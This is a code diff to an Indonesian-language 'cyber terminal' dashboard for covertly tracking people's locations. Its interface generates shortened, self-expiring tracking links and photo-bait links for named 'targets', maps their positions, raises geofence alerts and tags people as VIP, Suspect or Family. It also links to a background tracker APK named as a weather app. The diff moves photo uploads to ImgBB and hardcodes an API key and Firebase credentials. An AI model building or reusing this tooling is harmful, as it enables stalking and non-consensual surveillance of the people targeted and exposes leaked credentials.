@@ -284,7 +284,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .dual-link-item.short .dl-url{color:var(--gold);font-weight:bold;font-size:12px}
 .dual-link-item.long .dl-url{color:var(--cyan)}
 
-/* ==== TEMA HITAM-BIRU GELAP BERKILAU (lapisan kilau, hanya warna) ==== */
 body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),transparent 60%),radial-gradient(900px 480px at -10% 108%,rgba(0,229,138,.06),transparent 60%),linear-gradient(180deg,#071021 0%,#04070d 45%,#02050a 100%);background-attachment:fixed}
 .term-header,.term-body{background-image:linear-gradient(180deg,rgba(56,189,248,.06),rgba(56,189,248,0) 42%);box-shadow:inset 0 1px 0 rgba(148,205,255,.08),inset 0 0 46px rgba(56,189,248,.035),0 10px 26px rgba(0,0,0,.45)}
 .prompt,.term-header .title,.top-bar .time,.cmp-dist{text-shadow:0 0 10px rgba(0,229,138,.5),0 0 26px rgba(0,229,138,.22)}
@@ -320,10 +319,8 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Analytics] Overview</div><div class="stats-grid"><div class="stat-card hi"><div class="stat-val" id="statTotal">0</div><div class="stat-lbl">Total Target</div></div><div class="stat-card hi"><div class="stat-val" id="statToday">0</div><div class="stat-lbl">Hari Ini</div></div><div class="stat-card"><div class="stat-val sm" id="statKota">—</div><div class="stat-lbl">Kota Terbanyak</div></div><div class="stat-card"><div class="stat-val sm" id="statPlatform">—</div><div class="stat-lbl">Platform</div></div></div><div class="tag-stats" id="tagStats"><div class="tag-stat"><div class="ts-n" id="tsVIP">0</div><div class="ts-l">VIP</div></div><div class="tag-stat"><div class="ts-n" id="tsSuspect">0</div><div class="ts-l">Suspect</div></div><div class="tag-stat"><div class="ts-n" id="tsClient">0</div><div class="ts-l">Client</div></div></div></div>
 <div class="term-body"><div class="prompt">[Analytics] Platform Breakdown</div><div class="chart-wrap"><div class="donut-chart" id="donutPlatform"><div class="donut-center"><div class="dc-n" id="donutTotal">0</div><div class="dc-l">Total</div></div></div><div class="legend" id="platformLegend"><div class="empty" style="padding:8px">Belum ada data</div></div></div></div>
 
-<!-- GLOBE 3D -->
 <div class="term-body"><div class="prompt">[Visual] Globe 3D Target</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› globe bumi realtime · rotasi otomatis · drag untuk memutar:</div><div id="globeBox"><canvas id="globeCanvas"></canvas><div class="globe-hint">◈ GLOBE VIEW — DRAG UNTUK ROTASI</div><div class="globe-count" id="globeCount">0 target</div></div></div>
 
-<!-- ═══ RADAR SERVER MONITOR ═══ -->
 <div class="term-body">
   <div class="prompt">[Monitor] Radar Server Online/Offline</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› pemantauan nyata status server · auto-refresh 10 detik:</div>
@@ -359,19 +356,14 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Audio] Kontrol Suara</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atur volume alert & beep:</div><div class="vol-wrap"><span class="vl">VOL</span><input type="range" id="volSlider" min="0" max="100" value="30" oninput="setVol(this.value)"><span class="vl" id="volLabel">30%</span></div></div>
 <div class="term-body"><div class="prompt">[Live] All Targets Map</div><div class="map-box tall"><div id="mapMulti" class="map-inner"></div><div class="map-label" id="multiLabel">◈ MULTI-TARGET LIVE</div><div class="map-coords" id="mapMultiCount">0 targets</div></div></div>
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">[ Set Geofence ]</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">[ Clear ]</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
-
-<!-- GENERATE LINK + UPLOAD FOTO -->
 <div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div><div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="term-btn" onclick="genLink()" style="margin:0;flex:1;min-width:130px">[ Track Link ]</button><button class="term-btn outline" onclick="genLinkMaps()" style="margin:0;flex:1;min-width:130px">[ Maps Link ]</button></div>
-<!-- TOMBOL UPLOAD FOTO BARU -->
 <input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)">
 <button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()" style="margin-top:8px">[ 📷 Upload Foto → Generate Link ]</button>
 <div id="linkResult" style="display:none;margin-top:12px"><div style="font-size:10px;color:var(--text-d);margin-bottom:6px" id="linkTypeLabel">› target link:</div><div class="link-url-box" id="linkUrl"></div><button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button></div></div>
-
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">[ CSV ]</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">[ JSON ]</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">[ Clear ]</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button></div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">[ ▶ Download APK ]</button></a></div>
 
-<!-- UTILITY PANEL -->
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
   <div class="tools-tabs">
@@ -501,12 +493,11 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
-import{getStorage,ref as sRef,uploadBytes,getDownloadURL}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js";
 const FC={apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",authDomain:"roraxbali-65802.firebaseapp.com",databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"roraxbali-65802",storageBucket:"roraxbali-65802.firebasestorage.app",messagingSenderId:750633313866,appId:"1:750636313866:web:3d2e552960e06db83968b3"};
-const app=initializeApp(FC);const db=getDatabase(app);const stg=getStorage(app);
+const app=initializeApp(FC);const db=getDatabase(app);
 const user=localStorage.getItem('username');if(!user)location.href='index.html';
 document.getElementById('userLabel').innerText=user;
-window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;window.stg=stg;
+window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;
 const wv=document.getElementById('welcomeVideo');
 if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
 let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
@@ -649,14 +640,16 @@ function showLoading(type){
   urlBox.innerHTML='<div style="padding:12px;text-align:center;color:var(--gold);font-size:11px;letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
 }
 
-/* ═══════════════════════════════════════════════
-   UPLOAD FOTO DARI DASHBOARD → GENERATE LINK view.html
-   ═══════════════════════════════════════════════ */
+/* ============================================================
+   UPLOAD FOTO VIA IMGBB → GENERATE LINK view.html
+   ============================================================ */
+const IMGBB_API_KEY = '913294d7a5148a6415a3b9d9153c9bbf';
+
 window.onDashFotoPicked = async function(event){
   const file = event.target.files && event.target.files[0];
   if(!file) return;
   if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
-  if(file.size > 5*1024*1024){ alert('Maks 5 MB.'); event.target.value=''; return; }
+  if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
 
   playKlik();
   addLog('📷 Upload foto: ' + file.name);
@@ -667,21 +660,37 @@ window.onDashFotoPicked = async function(event){
   const labelEl = document.getElementById('linkTypeLabel');
   resBox.style.display = 'block';
   if(labelEl) labelEl.innerText = '› mengunggah foto...';
-  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Upload ke Firebase Storage...</div>';
+  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
 
   try{
-    const ext = file.name.split('.').pop().toLowerCase().slice(0,5) || 'jpg';
-    const fname = 'dash_' + Date.now() + '_' + Math.random().toString(36).slice(2,8) + '.' + ext;
-    const path = 'dash_uploads/' + user + '/' + fname;
-    const sref = sRef(stg, path);
+    // Convert file ke base64
+    const base64 = await new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.onload = () => resolve(reader.result.split(',')[1]);
+      reader.onerror = reject;
+      reader.readAsDataURL(file);
+    });
 
-    await uploadBytes(sref, file, { contentType: file.type });
-    const downloadUrl = await getDownloadURL(sref);
+    // Upload ke ImgBB
+    const formData = new FormData();
+    formData.append('key', IMGBB_API_KEY);
+    formData.append('image', base64);
 
-    addLog('✓ Foto terupload', 'ok');
+    const resp = await fetch('https://api.imgbb.com/1/upload', {
+      method: 'POST',
+      body: formData
+    });
+    const json = await resp.json();
+
+    if(!json.success){
+      throw new Error(json.error?.message || 'Upload ImgBB gagal');
+    }
+
+    const downloadUrl = json.data.url;
+    const deleteUrl = json.data.delete_url || '';
+    addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
 
     const t = document.getElementById('targetName').value.trim() || 'target';
-
     const longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(downloadUrl)
                   + '&u=' + encodeURIComponent(user)
                   + '&t=' + encodeURIComponent(t);
@@ -726,6 +735,7 @@ window.onDashFotoPicked = async function(event){
     event.target.value = '';
   }
 };
+/* ============================================================ */
 
 window.genLink=async function(){
   playKlik();saveBase();
@@ -1096,7 +1106,7 @@ setInterval(function(){if(Math.random()<0.4){var msg=lcMsgPool[Math.floor(Math.r
 pushConsoleLine('Firebase connected — /lokasi/'+user,'ok');
 pushConsoleLine('Server monitor initialized','ok');
 
-console.log('%c[CYBER TERMINAL] Loaded — Radar Server aktif + Upload Foto','color:#00e58a;font-weight:bold');
+console.log('%c[CYBER TERMINAL] Loaded — Upload via ImgBB','color:#00e58a;font-weight:bold');
 </script>
 <script>
 (function(){'use strict';var volLevel=0.3;try{var vs=localStorage.getItem('volLevel');if(vs)volLevel=parseFloat(vs)}catch(e){}var volEl=document.getElementById('volSlider');var volLabel=document.getElementById('volLabel');if(volEl){volEl.value=Math.round(volLevel*100);volLabel.textContent=Math.round(volLevel*100)+'%'}window.setVol=function(v){volLevel=Math.max(0,Math.min(1,v/100));volLabel.textContent=Math.round(volLevel*100)+'%';try{localStorage.setItem('volLevel',volLevel)}catch(e){}};var lastTypeSound=0;function typeBeep(){var now=Date.now();if(now-lastTypeSound<45)return;lastTypeSound=now;if(volLevel<=0)return;try{var ac=new(window.AudioContext||window.webkitAudioContext)();var o=ac.createOscillator();var g=ac.createGain();o.type='square';o.frequency.value=1400+Math.random()*800;g.gain.setValueAtTime(volLevel*0.04,ac.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.04);o.connect(g);g.connect(ac.destination);o.start();o.stop(ac.currentTime+0.04)}catch(e){}}document.addEventListener('input',function(e){var t=e.target;if(t&&(t.tagName==='INPUT'||t.tagName==='TEXTAREA'))typeBeep()},true);function updateBattery(){if(!navigator.getBattery)return;navigator.getBattery().then(function(b){function upd(){var p=Math.round(b.level*100);var pctEl=document.getElementById('batPct');var fillEl=document.getElementById('batFill');var stEl=document.getElementById('batStatus');if(!pctEl)return;pctEl.textContent=p+'%';fillEl.style.width=p+'%';var st=b.charging?'MENGISI ⚡':'BATERAI '+p+'%';if(p<=20&&!b.charging)st='⚠ LOW BATTERY';stEl.textContent=st;stEl.style.color=p<=20&&!b.charging?'var(--red)':'var(--cyan)'}upd();b.addEventListener('levelchange',upd);b.addEventListener('chargechange',upd)}).catch(function(){})}updateBattery();function updateNet(){var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;var tEl=document.getElementById('netType');var sEl=document.getElementById('netSpeed');if(!tEl)return;if(!c){tEl.textContent='N/A';sEl.textContent='N/A';return}tEl.textContent=(c.effectiveType||'unknown').toUpperCase();sEl.textContent=(c.downlink||'?')+' Mbps · '+(c.rtt||'?')+'ms'}updateNet();if(navigator.connection)navigator.connection.addEventListener('change',updateNet);var decryptOverlay=document.getElementById('decryptOverlay');var dcHex=document.getElementById('dcHex');var dcFill=document.getElementById('dcFill');var dcPct=document.getElementById('dcPct');var decrypting=false;window.runDecrypt=function(callback){if(decrypting){if(callback)callback();return}decrypting=true;decryptOverlay.classList.add('show');var pct=0;var hexTimer=setInterval(function(){var s='';for(var i=0;i<40;i++)s+=Math.floor(Math.random()*2)?'1':'0';dcHex.textContent=s},60);var pTimer=setInterval(function(){pct+=Math.random()*8+2;if(pct>=100){pct=100;clearInterval(pTimer);clearInterval(hexTimer)}dcFill.style.width=pct+'%';dcPct.textContent=Math.floor(pct)+'%';if(pct>=100){setTimeout(function(){decryptOverlay.classList.remove('show');decrypting=false;if(callback)callback()},400)}},90)};fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(d){var ipEl=document.getElementById('ipPub');if(!ipEl)return;ipEl.textContent=d.ip||'-';document.getElementById('ipIsp').textContent=d.org||'-';document.getElementById('ipLoc').textContent=(d.city||'-')+', '+(d.country_name||'-');document.getElementById('ipTz').textContent=d.timezone||'-';document.getElementById('ipUa').textContent=navigator.userAgent.slice(0,60)+'...'}).catch(function(){var ipEl=document.getElementById('ipPub');if(ipEl)ipEl.textContent='Gagal memuat'});function pad(n){return String(n).padStart(2,'0')}setInterval(function(){var d=new Date();var l=document.getElementById('clkLocal');var u=document.getElementById('clkUtc');var x=document.getElementById('clkUnix');if(l)l.textContent=pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());if(u)u.textContent=pad(d.getUTCHours())+':'+pad(d.getUTCMinutes())+':'+pad(d.getUTCSeconds());if(x)x.textContent=Math.floor(d.getTime()/1000)},1000);var satStatuses=['MENGHUBUNGKAN SATELIT...','SINKRONISASI ORBIT...','LOCK ON SIGNAL','UPLINK STABIL','SATELIT AKTIF'];var si=0;setInterval(function(){var el=document.getElementById('satStatus');if(!el)return;el.textContent=satStatuses[si%satStatuses.length];si++},3500);setInterval(function(){var ping=document.getElementById('satPing');var coord=document.getElementById('satCoord');if(!ping)return;var ms=Math.floor(20+Math.random()*80);var sig=Math.floor(70+Math.random()*30);ping.textContent='PING: '+ms+' ms · SIGNAL: '+sig+'%';if(coord){var la=(Math.random()*180-90).toFixed(4);var ln=(Math.random()*360-180).toFixed(4);coord.textContent='ORBIT: '+la+', '+ln}},1800);var hasilEl=document.getElementById('hasil');if(hasilEl&&window.MutationObserver){var firstMut=true;var observer=new MutationObserver(function(){if(firstMut){firstMut=false;return}if(!decrypting)runDecrypt()});observer.observe(hasilEl,{childList:true,subtree:true})}console.log('%c[CYBER TERMINAL] Helper active','color:#00e58a;font-weight:bold')})();
